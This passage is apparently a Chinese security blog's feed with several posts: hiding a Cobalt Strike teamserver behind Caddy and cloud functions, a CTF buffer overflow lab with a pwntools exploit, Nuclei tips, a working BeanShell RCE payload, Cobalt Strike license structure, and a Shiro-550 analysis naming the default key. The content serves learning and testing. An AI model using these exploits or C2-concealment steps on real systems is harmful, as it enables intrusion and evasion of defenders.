class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://random-domain &#123;</span><br><span class="line">    reverse_proxy /* localhost:33080 &#123;</span><br><span class="line">        header_up X-Forwarded-For &#123;header.X-Forwarded-For&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">https://random-domain &#123;</span><br><span class="line">        reverse_proxy /* localhost:33443 &#123;</span><br><span class="line">        header_up X-Forwarded-For &#123;header.X-Forwarded-For&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="隐匿TeamServer真实IP"><a href="#隐匿TeamServer真实IP" class="headerlink" title="隐匿TeamServer真实IP"></a>隐匿TeamServer真实IP</h2><h4 id="域前置"><a href="#域前置" class="headerlink" title="域前置"></a>域前置</h4><p>这里相关博客网上有很多，而且我也没配置过。这里就不细说了。</p><h4 id="云函数-x2F-云网关"><a href="#云函数-x2F-云网关" class="headerlink" title="云函数&#x2F;云网关"></a>云函数&#x2F;云网关</h4><p>云函数这里部署可以参考搜索腾讯云函数部署，相关代码参考<a href="https://github.com/shimmeris/SCFProxy">SCFProxy</a>项目。</p><blockquote><p>值得注意的是使用参考相关文章进行部署完成后，在TeamServer上的外部IP会不断变化，这里需要在profile中设置XFF头(参考Caddy部分)。此处的流量传递过程是beacon –&gt; (云网关 –&gt; 云函数) [–&gt; caddy] –&gt; listener，如果使用了转发器转发还需要将在转发器中修改XFF头(参考Caddy的配置)，因为caddy获取到的地址是由云函数传递过来的，要将云网关&#x2F;云函数获取的真实地址传递给caddy。</p></blockquote><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>【R1】<a href="https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/">https://hosch3n.github.io/2020/12/16/检测与隐藏Cobaltstrike服务器/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;CobaltStrike已经是Red Team中使用最广泛的远控程序，但是CobaltStrike中也存在一些问题，部分比较严重的问题只能通过修改代码进行修补，而有些问题可以通过更改部署方式实现修补&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux Buffer Overflow</title>
    <link href="https://arrnitage.github.io/Linux-Buffer-Overflow/"/>
    <id>https://arrnitage.github.io/Linux-Buffer-Overflow/</id>
    <published>2022-06-02T13:02:23.000Z</published>
    <updated>2022-06-02T13:02:23.926Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前置基础知识"><a href="#前置基础知识" class="headerlink" title="前置基础知识"></a>前置基础知识</h2><blockquote><p>本文记录学习ctf-wiki的实验过程</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/</a></p></blockquote><ol><li>汇编中<code>CALL</code>与<code>RET</code>指令</li><li>汇编中高级过程，通过堆栈传递函数参数</li><li>汇编中的函数调用过程及堆栈变化</li><li>gdb使用方法</li></ol><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul><li>[+]ubuntu<ul><li>[+]关闭ASLR。修改&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space文件</li><li>[+]gcc + gcc-multilib</li></ul></li><li>[+]pwntools</li><li>[+]pwngdb（gdb插件）</li></ul><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line">gets(s);</span><br><span class="line"><span class="built_in">puts</span>(s);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> args, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">vulnerable();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编译程序"><a href="#编译程序" class="headerlink" title="编译程序"></a>编译程序</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector overflow.c -o example</span><br></pre></td></tr></table></figure><ul><li><code>-m32</code> 执行编译程序为32位程序</li><li><code>-fno-stack-protector</code> 关闭栈溢出保护</li><li><code>-o</code> 编译后输出的文件名</li></ul><h2 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h2><h3 id="下断点"><a href="#下断点" class="headerlink" title="下断点"></a>下断点</h3><p>在gdb中利用函数下断点<code>b vulnerable</code>，函数断在vulnerable入口</p><p><img src="/Linux-Buffer-Overflow/image-20201024002845892.png" alt="image-20201024002845892"></p><p>逐步执行到<code>0x56556239</code>，输入过量的字符</p><p><img src="/Linux-Buffer-Overflow/image-20201024002933886.png" alt="image-20201024002933886"></p><p>继续向下，其中注意栈中的数据覆盖情况，由于输入了过量的字符，缓冲区空间被填满并溢出，溢出的数据将缓冲区后面的地址覆盖</p><p><img src="/Linux-Buffer-Overflow/image-20201024002959099.png" alt="image-20201024002959099"></p><p>继续向下执行查看vulnerable函数的RET指令返回地址，返回地址信息为<code>0x7271706f</code>，该地址信息是连续递减的16进制数字，转换为ascii为<code>rqpo</code>。在计算机中，由于小端显示会将正常的输入翻序，所以原信息为<code>opqr</code>，正好对应上图栈地址中<code>0xffffd04c</code>的内容，而该地址是<code>ebp+4</code>。</p><p><img src="/Linux-Buffer-Overflow/image-20201024003014134.png" alt="image-20201024003014134"></p><p>根据汇编中的RET指令的原理，如果将RET跳转的地址信息进行覆盖，覆盖为一个有效的命令执行地址，那就可以控制程序的执行过程，从而执行我们希望执行的指令。</p><h3 id="构造利用代码"><a href="#构造利用代码" class="headerlink" title="构造利用代码"></a>构造利用代码</h3><p>通过数有次序的字符，可以猜出缓冲区的大小。这个题中缓冲区大小为20个字节，所以要先用20个字节将缓冲区填满<code>\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41</code>，再对<code>EBP</code>进行覆盖<code>\\x42\\x42\\x42\\x42</code>，再拼接要跳转小端显示的地址（该题目要求跳转到success函数中，可以通过IDA Pro等逆向工具获取success函数的内存地址，我是通过在gdb中对success下断点获取到的内存地址），原地址为<code>0x565561ed</code>，经过小端显示处理后为<code>\\xed\\x61\\x55\\x56</code>，将这三个部分进行拼接得到payload</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41</span><br><span class="line">\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41</span><br><span class="line">\\x41\\x41\\x41\\x41\\x42\\x42\\x42\\x42</span><br><span class="line">\\xed\\x61\\x55\\x56</span><br></pre></td></tr></table></figure><p>因为这里的\xed是非打印字符，所以我采用python发送的方式进行调试，利用pwntools进行输入。</p><p>在调试器中成功执行。</p><p><img src="/Linux-Buffer-Overflow/image-20201024003030315.png" alt="image-20201024003030315"></p><h2 id="利用pwntools编写利用代码"><a href="#利用pwntools编写利用代码" class="headerlink" title="利用pwntools编写利用代码"></a>利用pwntools编写利用代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process</span><br><span class="line"><span class="comment"># p32函数作用是将数字转换为小端显示的byte</span></span><br><span class="line"><span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> p32</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./example&#x27;</span>)</span><br><span class="line">success_addr = <span class="number">0x80491b6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># buffer_size = 0123456789abcdefghij  ret = klmn   ret = opqr others = stuvwxyz</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x4</span> + p32(success_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>[+]  目前只在调试器中成功执行，在脱离调试器后还无法显示结果，正在努力解决。</li><li>目前对pwntools还不太了解，要熟练掌握。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前置基础知识&quot;&gt;&lt;a href=&quot;#前置基础知识&quot; class=&quot;headerlink&quot; title=&quot;前置基础知识&quot;&gt;&lt;/a&gt;前置基础知识&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;本文记录学习ctf-wiki的实验过程&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Nuclei Tips</title>
    <link href="https://arrnitage.github.io/Nuclei-Tips/"/>
    <id>https://arrnitage.github.io/Nuclei-Tips/</id>
    <published>2022-05-29T10:44:57.000Z</published>
    <updated>2022-05-29T10:44:57.495Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>最近使用nuclei比较多，总结一下一些常用的命令和如何配置nuclei能让这个工具更好用</p></blockquote><h2 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h2><ol><li><code>-u</code>：测试单个url时使用，后面跟一个url地址</li><li><code>-l</code>：进行批量测试时使用，后面跟一个写了url地址的文件路径</li><li><code>-t</code>：指定使用的PoC模版</li><li><code>-w</code>：指定使用的workflow模版，workflow模版路径为<code>nuclei-template/workflow</code></li><li><code>-tags</code>：指定使用带有指定tag的PoC模版</li><li><code>-o</code>：将结果输出到一个文件中</li></ol><p>以上这些就是会经常用到的一些参数</p><h2 id="nuclei-template存放路径"><a href="#nuclei-template存放路径" class="headerlink" title="nuclei-template存放路径"></a>nuclei-template存放路径</h2><p>nuclei-template是nuclei的一个非常丰富的官方PoC库，但在使用过程中有一些小问题，就是nuclei-template会默认下载至用户的根目录下</p><ul><li>Linux: <code>/home/user_name/nuclei-template</code></li><li>macOS: <code>/Users/user_name/nuclei-template</code></li><li>Windows: <code>C:\Users\user_name\nuclei-template</code></li></ul><p>很显然，这对一些人来说就很难受，比如我。当然，要修改这个也非常简单。当你运行过一次nuclei之后，nuclei会在用户跟目录下生成一个存放配置文件的路径<code>.config/nuclei</code>，这个路径下通常会有如下几个文件</p><ol><li>config.yaml</li><li>.nuclei-ignore</li><li>.templates-config.json</li></ol><p>打开<code>.templates-config.json</code>，通过修改<code>nuclei-templates-directory</code>的值就可以将nuclei-template的默认保存路径进行修改</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;nuclei-templates-directory&quot;</span><span class="punctuation">:</span><span class="string">&quot;/Users/your_name/nuclei-templates&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;nuclei-templates-version&quot;</span><span class="punctuation">:</span><span class="string">&quot;9.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;nuclei-version&quot;</span><span class="punctuation">:</span><span class="string">&quot;2.7.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;nuclei-ignore-hash&quot;</span><span class="punctuation">:</span><span class="string">&quot;8f61b6d0f735f59c10fc642c688c6624&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;nuclei-latest-version&quot;</span><span class="punctuation">:</span><span class="string">&quot;2.7.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;nuclei-templates-latest-version&quot;</span><span class="punctuation">:</span><span class="string">&quot;9.0.1&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="排除不想要的template"><a href="#排除不想要的template" class="headerlink" title="排除不想要的template"></a>排除不想要的template</h2><p>nuclei-template因为太丰富了，在使用过程中会像AWVS一样扫描出很多无法利用且我们也不关注的问题，这时候就需要用到刚刚配置路径下的<code>.nuclei-ignore</code>配置文件。<br>整个文件使用了YAML结构，修改起来也非常简单。原文件中一共就给了两部分<code>tags</code>与<code>files</code>，可以通过指定tag名称与文件路径排除不想使用的模版文件。下面是例子</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">tags:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;fuzz&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;dos&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;xss&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">files:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">misconfiguration/http-missing-security-headers.yaml</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">ssl/</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">dns/ptr-fingerprint.yaml</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">technologies/nginx/</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">miscellaneous/options-method.yaml</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">miscellaneous/old-copyright.yaml</span></span><br></pre></td></tr></table></figure><p>nuclei-ignore中的files支持通过指定路径，直接排除该路径下的所有模版文件，这样就可以批量的排除不想使用的模版啦。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;最近使用nuclei比较多，总结一下一些常用的命令和如何配置nuclei能让这个工具更好用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;常用参数&quot;&gt;&lt;a href=&quot;#常用参数&quot; class=&quot;headerlink&quot; title=&quot;常用参数</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>BeanShell RCE 排坑</title>
    <link href="https://arrnitage.github.io/BeanShell-RCE-%E6%8E%92%E5%9D%91/"/>
    <id>https://arrnitage.github.io/BeanShell-RCE-%E6%8E%92%E5%9D%91/</id>
    <published>2022-05-06T10:42:34.000Z</published>
    <updated>2022-12-23T07:38:24.499Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>最近在测试过程中遇到了<strong>NC BeanShell RCE</strong>漏洞，网络上大部分都是用BeanShell自带的 <code>exec</code>函数执行反弹shell命令，但无法直接执行反弹shell。</p></blockquote><h2 id="寻根溯源"><a href="#寻根溯源" class="headerlink" title="寻根溯源"></a>寻根溯源</h2><p><code>exec</code>函数在BeanShell中定义如下</p><p><img src="/BeanShell-RCE-%E6%8E%92%E5%9D%91/Untitled.png" alt="Untitled"></p><p>参数是一个 <code>String</code>类型，并且根据下面的描述是调用了 <code>Runtime.getRuntime().exec()</code>。</p><p>搞过Java命令执行的都知道，Java如果要执行命令不能向python之类的直接通过字符串执行命令，需要将命令转化为 <code>String[]</code>类型</p><p>所以网络上大部分的poc&#x2F;exp都是只能执行部分命令，无法执行带有各种管道、参数的命令。</p><p>由于在cmd与bash中各种命令的实现不同，比如在Linux中<code>id</code>是一个elf程序，而<code>echo</code>则更像是一种宏。且beanshell中原本exec定义是传入字符串，但具体的实现方法Runtime.getRuntime.exec允许传入字符串数组重载。所以我们只需要将exec重新实现一遍即可</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>解决方法也非常简单，既然这里可以使用beanshell script进行命令执行，那我们直接自己用Runtime exec构造命令执行代码就完事了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;whoami&quot;</span>&#125;</span><br><span class="line">Runtime.getRuntime().exec(cmd)</span><br></pre></td></tr></table></figure><p>用了这个payload发现命令可以执行了，但是网站没有回显，写成脚本也没有办法直接获取一些命令的结果，就还得通过生成文件再查看结果，太丑陋了！！</p><p>就想到如果我知道 <code>exec</code>方法的实现过程，我再根据这个实现过程去实现刚才的payload就可以完成结果回显。</p><p>直接去找beanshell项目，查找 <code>exec</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    Start an external application using the Java Runtime exec() method.</span></span><br><span class="line"><span class="comment">    Display any output to the standard BeanShell output using print().</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">bsh.help.exec = <span class="string">&quot;usage: exec( String arg )&quot;</span>;</span><br><span class="line"></span><br><span class="line">exec( String arg )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">this</span>.proc = Runtime.getRuntime().exec(arg);</span><br><span class="line">    <span class="built_in">this</span>.din = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>( proc.getInputStream() );</span><br><span class="line">    <span class="keyword">while</span>( (line=din.readLine()) != <span class="literal">null</span> )</span><br><span class="line">        print(line);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">exec( String[] arg )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">this</span>.proc = Runtime.getRuntime().exec(arg);</span><br><span class="line">    <span class="built_in">this</span>.din = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>( proc.getInputStream() );</span><br><span class="line">    <span class="keyword">while</span>( (line=din.readLine()) != <span class="literal">null</span> )</span><br><span class="line">        print(line);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.proc.exitValue();</span><br><span class="line">&#125;</span><br><span class="line">exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo 123&quot;</span>&#125;)</span><br></pre></td></tr></table></figure><p><img src="/BeanShell-RCE-%E6%8E%92%E5%9D%91/1671776451881.png" alt="1671776451881"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;最近在测试过程中遇到了&lt;strong&gt;NC BeanShell RCE&lt;/strong&gt;漏洞，网络上大部分都是用BeanShell自带的 &lt;code&gt;exec&lt;/code&gt;函数执行反弹shell命令，但无法直接执行反弹shell。&lt;/p&gt;
&lt;/bl</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Cobalt Strike License</title>
    <link href="https://arrnitage.github.io/Cobalt-Strike-License/"/>
    <id>https://arrnitage.github.io/Cobalt-Strike-License/</id>
    <published>2022-05-04T07:13:13.000Z</published>
    <updated>2022-05-04T07:13:13.751Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>跟着许多大佬的文章分析过Cobalt Strike对License认证过程。整个License中最重要的就是解密Key。通过这个解密Key才可以对sleeve中的beacon与加载执行的PE程序进行解密。但在这个blog中不讲整个的认证流程，只说一下License的结构。（License就是cobaltstrike.auth）。由于可能会受Github的DMCA Policy影响，4.0-4.4的解密Key就不直接放出来了。如果有需要，可以直接向我<a href="mailto:an0ther1412@qq.com">发送邮件</a>并表明你的需求；）</p></blockquote><h2 id="解析过程"><a href="#解析过程" class="headerlink" title="解析过程"></a>解析过程</h2><p>根据 <code>AuthCrypto.java</code> 中60行判断读取的第一个 Int 长度的数据是否等于 <code>-889274157</code>，进入到<code>else</code>分支中，先读取了一个 Short 长度，并将剩余部分返回。</p><p><img src="/Cobalt-Strike-License/Untitled-1.png" alt="AuthCrypto"></p><p>在上一部分中返回的数据中有进行了如下解析。</p><ol><li>读取Int长度数据作为57行进行License有效时间的判断。</li><li>读取Int长度数据作为水印。</li><li>读取一个Byte长度数据，判断是否大于44作为适用版本判断。</li><li>之后不断的进行读一个Byte，再根据Byte大小读取相同长度的数据。如此循环5次，每个循环分别是读取了4.0版本到4.4版本的解密 Key。 并将读取到最后的解密Key给到 <code>SleeveResource.Setup()</code> 方法中。</li></ol><p><img src="/Cobalt-Strike-License/Untitled.png" alt="Authorization"></p><h2 id="cobaltstrike-auth-结构"><a href="#cobaltstrike-auth-结构" class="headerlink" title="cobaltstrike.auth 结构"></a>cobaltstrike.auth 结构</h2><p>根据 Cobalt Strike 4.4中 <code>AuthCrypto.java</code> 与 <code>Authorization.java</code> 解析过程分析出的 License 结构。</p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00  | -889274157</span><br><span class="line">00 00        | 之后的字节数</span><br><span class="line">00 00 00 00  | 29999999</span><br><span class="line">00 00 00 00  | watermark</span><br><span class="line">00           | &gt;43</span><br><span class="line"></span><br><span class="line">00           | Authorization():var8 = 16</span><br><span class="line">00*16        | len = var8 CS4.0 用来对dll解密的密钥 </span><br><span class="line"></span><br><span class="line">00           | Authorization():var10 = 16</span><br><span class="line">00*16        | len = var10 CS4.1 用来对dll解密的密钥 </span><br><span class="line"></span><br><span class="line">00           | Authorization():var12 = 16</span><br><span class="line">00*16        | len = var12 CS4.2 用来对dll解密的密钥 </span><br><span class="line"></span><br><span class="line">00           | Authorization():var14 = 16</span><br><span class="line">00*16        | len = var14 CS4.3 用来对dll解密的密钥 </span><br><span class="line"></span><br><span class="line">00           | Authorization():var14 = 16</span><br><span class="line">00*16        | len = var14 CS4.4 用来对dll解密的密钥 </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;跟着许多大佬的文章分析过Cobalt Strike对License认证过程。整个License中最重要的就是解密Key。通过这个解密Key才可以对sleeve中的beacon与加载执行的PE程序进行解密。但在这个blog中不讲整个的认证流程，只说一</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Shiro-550</title>
    <link href="https://arrnitage.github.io/Shiro-550/"/>
    <id>https://arrnitage.github.io/Shiro-550/</id>
    <published>2022-04-25T02:38:32.000Z</published>
    <updated>2022-04-25T02:38:32.054Z</updated>
    
    <content type="html"><![CDATA[<h2 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h2><ol><li><p>操作系统 macOS</p></li><li><p>直接用homebrew安装tomcat，<code>brew install tomcat@8</code></p></li><li><p>java直接使用oracle java 1.8</p></li><li><p>shiro环境部署时参考了【R1】中的部署方式</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/apache/shiro.git</span></span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root-<span class="number">1.2</span><span class="number">.4</span></span><br></pre></td></tr></table></figure></li><li><p>使用idea打开<code>shiro/samples/web</code>目录</p></li><li><p>修改<code>pom.xml</code>，在其中补充</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 在javax.servlet.jstl中补充一个version标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="部署到Tomcat"><a href="#部署到Tomcat" class="headerlink" title="部署到Tomcat"></a>部署到Tomcat</h2><p>在idea中配置tomcat， 在左侧添加Tomcat Server —&gt; Local</p><p><img src="/Shiro-550/Untitled.png" alt="Untitled"></p><p><img src="/Shiro-550/Untitled_1.png" alt="Untitled"></p><p>完成如上配置后点击<code>Apply</code> 保存配置，点击<code>OK</code>关闭<code>Run/Debug Configure</code>窗口。点击一旁的<code>Run</code>按钮，通过浏览器访问配置中的URL配置项的路径（通常会默认打开浏览器访问）查看能否正常运行。</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><h3 id="初始化过程"><a href="#初始化过程" class="headerlink" title="初始化过程"></a>初始化过程</h3><p>根据漏洞细节，我们知道shiro使用了一个固定编码的key<code>kPH+bIxk5D2deZiIxcaaaA==</code>，所以直接在整个项目文件中检索该key，找到该文件的所在位置。</p><p><img src="/Shiro-550/Untitled_2.png" alt="Untitled"></p><p>该类实现了<code>RememberMeManager</code>接口，接口有5个方法，不同的认证过程进入不同的函数。</p><p><img src="/Shiro-550/Untitled_3.png" alt="Untitled"></p><p><code>AbstractRememberMeManager</code>在实例化时直接将<code>encryptionCipherKey</code>与<code>decryptionCipherKey</code>进行初始化</p><p><img src="/Shiro-550/Untitled_4.png" alt="Untitled"></p><p>从setCipherKey进入，不断跟进，结果是直接将<code>DEFAULT_CIPHER_KEY_BYTES</code>赋值给<code>encryptionCipherKey</code>与<code>decryptionCipherKey</code></p><p>加密方法直接实例化了一个<code>AesCipherService</code>，由此可以见，加密方法为Aes加密</p><h3 id="序列化过程"><a href="#序列化过程" class="headerlink" title="序列化过程"></a>序列化过程</h3><p>从<code>onSuccessfulLogin</code>跟进程序，首先调用了forgetIdentity方法，但该方法没有任何内容执行。之后判断是否设置rememberMe，所以在登陆是要勾选remember 